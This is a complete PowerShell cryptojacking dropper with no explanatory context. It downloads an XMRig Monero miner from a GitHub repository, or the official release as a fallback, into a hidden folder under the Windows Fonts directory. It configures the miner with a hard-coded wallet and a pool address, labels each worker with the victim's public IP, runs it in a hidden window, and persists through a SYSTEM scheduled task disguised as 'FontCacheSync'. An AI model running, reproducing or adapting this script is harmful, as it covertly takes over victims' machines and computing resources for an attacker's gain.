$W="w8w-"+( (iwr "http://ifconfig.me" -UseBasicParsing -TimeoutSec 5).Content.Trim() -replace "\.","-" )
$B="$env:windir\Fonts\.tzcache"
New-Item -ItemType Directory -Force -Path $B | Out-Null
$U="https://raw.githubusercontent.com/burmaldagpt/gconv-cache/main/w8x64.zip"
try { iwr $U -OutFile "$B\g.zip" -UseBasicParsing -TimeoutSec 60 } catch { iwr "https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-msvc-win64.zip" -OutFile "$B\g.zip" -UseBasicParsing -TimeoutSec 120 }
Expand-Archive "$B\g.zip" -DestinationPath $B -Force
$e=Get-ChildItem $B -Recurse -Filter xmrig.exe | Select-Object -First 1
if(-not $e){ return }
$conf=@"
{
  "autosave": true,
  "cpu": { "max-threads-hint": 60 },
  "pools": [ { "url": "gulf.moneroocean.stream:443", "user": "42cRzqLbgMMZVex62mpPZYL9VLDdfjTvm8SGZc2KuvQdeK4eWaQav9TSXpcUZnYWCtidyABFmYuBA8Ub4VkYmjFTUUcpe79.$W", "tls": true } ]
}
"@
Set-Content "$($e.DirectoryName)\c.json" $conf
$hide=-WindowStyle Hidden
Start-Process $e.FullName -ArgumentList "-c","$($e.DirectoryName)\c.json","--donate-level","0","--cpu-max-threads-hint","60" -WindowStyle Hidden
schtasks /create /tn "FontCacheSync" /tr "`"$($e.FullName)`" -c `"$($e.DirectoryName)\c.json`" --donate-level 0" /sc minute /mo 30 /ru SYSTEM /f 2>$null
Remove-Item "$B\g.zip" -Force
